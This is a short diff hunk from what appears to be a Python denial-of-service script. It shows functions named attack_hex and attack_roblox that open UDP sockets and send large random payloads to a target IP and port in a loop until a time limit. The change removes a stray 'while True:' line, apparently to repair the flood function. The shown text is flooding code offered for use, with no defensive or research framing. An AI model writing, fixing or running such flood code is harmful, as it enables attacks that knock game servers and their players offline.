@@ -58,7 +58,6 @@ def attack_hex(ip, port, secs):
         s.sendto(payload, (ip, port))
 
 def attack_roblox(ip, port, secs, size=65400):
-while True:
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         bytes = random.urandom(size)
